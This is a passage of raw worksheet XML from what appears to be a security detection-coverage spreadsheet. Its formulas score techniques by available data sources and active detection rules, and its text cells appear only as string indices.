        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M517" s="9" cm="1">
        <f t="array" ref="M517">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N517" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O517" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P517" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S51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17" t="s">
        <v>386</v>
      </c>
      <c r="U517" t="s">
        <v>2463</v>
      </c>
      <c r="V517" t="s">
        <v>2464</v>
      </c>
      <c r="W517" t="b">
        <v>1</v>
      </c>
      <c r="X517" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="518" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A518" t="s">
        <v>2419</v>
      </c>
      <c r="B518" t="s">
        <v>2465</v>
      </c>
      <c r="C518" t="s">
        <v>2466</v>
      </c>
      <c r="D518" t="s">
        <v>2420</v>
      </c>
      <c r="E518" t="s">
        <v>2467</v>
      </c>
      <c r="F518" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G518" s="9" cm="1">
        <f t="array" ref="G518">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H518" s="9" t="str" cm="1">
        <f t="array" ref="H518">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I518" s="9" t="str" cm="1">
        <f t="array" ref="I518">IF(SUM(IF($C518=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C518=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J518" s="9" t="str" cm="1">
        <f t="array" ref="J51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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M518" s="9" cm="1">
        <f t="array" ref="M518">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N518" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O518" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P518" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S51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18" t="s">
        <v>386</v>
      </c>
      <c r="U518" t="s">
        <v>2468</v>
      </c>
      <c r="V518" t="s">
        <v>2469</v>
      </c>
      <c r="W518" t="b">
        <v>1</v>
      </c>
      <c r="X518" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="519" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A519" t="s">
        <v>2419</v>
      </c>
      <c r="B519" t="s">
        <v>2470</v>
      </c>
      <c r="C519" t="s">
        <v>2471</v>
      </c>
      <c r="D519" t="s">
        <v>2420</v>
      </c>
      <c r="E519" t="s">
        <v>1802</v>
      </c>
      <c r="F519" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G519" s="9" cm="1">
        <f t="array" ref="G519">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H519" s="9" t="str" cm="1">
        <f t="array" ref="H519">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I519" s="9" t="str" cm="1">
        <f t="array" ref="I519">IF(SUM(IF($C519=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C519=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J519" s="9" t="str" cm="1">
        <f t="array" ref="J51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19" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M519" s="9" cm="1">
        <f t="array" ref="M519">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N519" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O519" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P519" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S51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19" t="s">
        <v>386</v>
      </c>
      <c r="U519" t="s">
        <v>2472</v>
      </c>
      <c r="V519" t="s">
        <v>2473</v>
      </c>
      <c r="W519" t="b">
        <v>1</v>
      </c>
      <c r="X519" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="520" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A520" t="s">
        <v>2419</v>
      </c>
      <c r="B520" t="s">
        <v>2474</v>
      </c>
      <c r="C520" t="s">
        <v>2475</v>
      </c>
      <c r="D520" t="s">
        <v>2420</v>
      </c>
      <c r="E520" t="s">
        <v>782</v>
      </c>
      <c r="F520" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G520" s="9" cm="1">
        <f t="array" ref="G520">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H520" s="9" t="str" cm="1">
        <f t="array" ref="H520">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I520" s="9" t="str" cm="1">
        <f t="array" ref="I520">IF(SUM(IF($C520=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C520=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J520" s="9" t="str" cm="1">
        <f t="array" ref="J52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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M520" s="9" cm="1">
        <f t="array" ref="M520">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N520" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O520" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P520" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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20" t="s">
        <v>386</v>
      </c>
      <c r="U520" t="s">
        <v>2476</v>
      </c>
      <c r="V520" t="s">
        <v>2477</v>
      </c>
      <c r="W520" t="b">
        <v>1</v>
      </c>
      <c r="X520" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="521" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A521" t="s">
        <v>2419</v>
      </c>
      <c r="B521" t="s">
        <v>2478</v>
      </c>
      <c r="C521" t="s">
        <v>2479</v>
      </c>
      <c r="D521" t="s">
        <v>2420</v>
      </c>
      <c r="E521" t="s">
        <v>2480</v>
      </c>
      <c r="F521" s="9">
        <f t="shared" si="8"/>
        <v>3</v>
      </c>
      <c r="G521" s="9" cm="1">
        <f t="array" ref="G521">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H521" s="9" t="str" cm="1">
        <f t="array" ref="H521">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I521" s="9" t="str" cm="1">
        <f t="array" ref="I521">IF(SUM(IF($C521=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C521=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J521" s="9" t="str" cm="1">
        <f t="array" ref="J52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21" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M521" s="9" cm="1">
        <f t="array" ref="M521">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N521" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O521" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P521" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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21" t="s">
        <v>386</v>
      </c>
      <c r="U521" t="s">
        <v>2481</v>
      </c>
      <c r="W521" t="b">
        <v>1</v>
      </c>
      <c r="X521" t="s">
        <v>2419</v>
      </c>
    </row>
    <row r="522" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A522" t="s">
        <v>2482</v>
      </c>
      <c r="B522" t="s">
        <v>2482</v>
      </c>
      <c r="C522" t="s">
        <v>187</v>
      </c>
      <c r="D522" t="s">
        <v>6</v>
      </c>
      <c r="E522" t="s">
        <v>2483</v>
      </c>
      <c r="F522" s="9">
        <f t="shared" si="8"/>
        <v>15</v>
      </c>
      <c r="G522" s="9" cm="1">
        <f t="array" ref="G522">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H522" s="9" cm="1">
        <f t="array" ref="H522">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I522" s="9" t="str" cm="1">
        <f t="array" ref="I522">IF(SUM(IF($C522=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C522=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J522" s="9" cm="1">
        <f t="array" ref="J52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522" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M522" s="9" cm="1">
        <f t="array" ref="M522">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N522" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O522" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P522" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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22" t="s">
        <v>520</v>
      </c>
      <c r="U522" t="s">
        <v>2484</v>
      </c>
      <c r="V522" t="s">
        <v>2485</v>
      </c>
      <c r="W522" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="523" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A523" t="s">
        <v>2482</v>
      </c>
      <c r="B523" t="s">
        <v>2486</v>
      </c>
      <c r="C523" t="s">
        <v>2487</v>
      </c>
      <c r="D523" t="s">
        <v>6</v>
      </c>
      <c r="E523" t="s">
        <v>2488</v>
      </c>
      <c r="F523" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G523" s="9" cm="1">
        <f t="array" ref="G523">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H523" s="9" t="str" cm="1">
        <f t="array" ref="H523">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I523" s="9" t="str" cm="1">
        <f t="array" ref="I523">IF(SUM(IF($C523=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C523=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J523" s="9" t="str" cm="1">
        <f t="array" ref="J52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23" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M523" s="9" cm="1">
        <f t="array" ref="M523">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N523" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O523" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P523" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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23" t="s">
        <v>520</v>
      </c>
      <c r="U523" t="s">
        <v>2489</v>
      </c>
      <c r="V523" t="s">
        <v>2490</v>
      </c>
      <c r="W523" t="b">
        <v>1</v>
      </c>
      <c r="X523" t="s">
        <v>2482</v>
      </c>
    </row>
    <row r="524" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A524" t="s">
        <v>2482</v>
      </c>
      <c r="B524" t="s">
        <v>2491</v>
      </c>
      <c r="C524" t="s">
        <v>291</v>
      </c>
      <c r="D524" t="s">
        <v>6</v>
      </c>
      <c r="E524" t="s">
        <v>1702</v>
      </c>
      <c r="F524" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G524" s="9" cm="1">
        <f t="array" ref="G524">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H524" s="9" t="str" cm="1">
        <f t="array" ref="H524">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I524" s="9" t="str" cm="1">
        <f t="array" ref="I524">IF(SUM(IF($C524=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C524=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J524" s="9" t="str" cm="1">
        <f t="array" ref="J52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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M524" s="9" cm="1">
        <f t="array" ref="M524">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N524" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O524" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P524" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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24" t="s">
        <v>520</v>
      </c>
      <c r="U524" t="s">
        <v>2492</v>
      </c>
      <c r="V524" t="s">
        <v>2493</v>
      </c>
      <c r="W524" t="b">
        <v>1</v>
      </c>
      <c r="X524" t="s">
        <v>2482</v>
      </c>
    </row>
    <row r="525" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A525" t="s">
        <v>2482</v>
      </c>
      <c r="B525" t="s">
        <v>2494</v>
      </c>
      <c r="C525" t="s">
        <v>2495</v>
      </c>
      <c r="D525" t="s">
        <v>6</v>
      </c>
      <c r="E525" t="s">
        <v>2496</v>
      </c>
      <c r="F525" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G525" s="9" cm="1">
        <f t="array" ref="G525">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H525" s="9" t="str" cm="1">
        <f t="array" ref="H525">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I525" s="9" t="str" cm="1">
        <f t="array" ref="I525">IF(SUM(IF($C525=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C525=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J525" s="9" t="str" cm="1">
        <f t="array" ref="J52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25" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M525" s="9" cm="1">
        <f t="array" ref="M525">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N525" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O525" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P525" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S52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25" t="s">
        <v>520</v>
      </c>
      <c r="U525" t="s">
        <v>2497</v>
      </c>
      <c r="V525" t="s">
        <v>2498</v>
      </c>
      <c r="W525" t="b">
        <v>1</v>
      </c>
      <c r="X525" t="s">
        <v>2482</v>
      </c>
    </row>
    <row r="526" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A526" t="s">
        <v>2482</v>
      </c>
      <c r="B526" t="s">
        <v>2499</v>
      </c>
      <c r="C526" t="s">
        <v>2500</v>
      </c>
      <c r="D526" t="s">
        <v>6</v>
      </c>
      <c r="E526" t="s">
        <v>2501</v>
      </c>
      <c r="F526" s="9">
        <f t="shared" si="8"/>
        <v>4</v>
      </c>
      <c r="G526" s="9" cm="1">
        <f t="array" ref="G526">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H526" s="9" t="str" cm="1">
        <f t="array" ref="H526">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I526" s="9" t="str" cm="1">
        <f t="array" ref="I526">IF(SUM(IF($C526=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C526=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J526" s="9" t="str" cm="1">
        <f t="array" ref="J52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26" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M526" s="9" cm="1">
        <f t="array" ref="M526">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N526" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O526" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
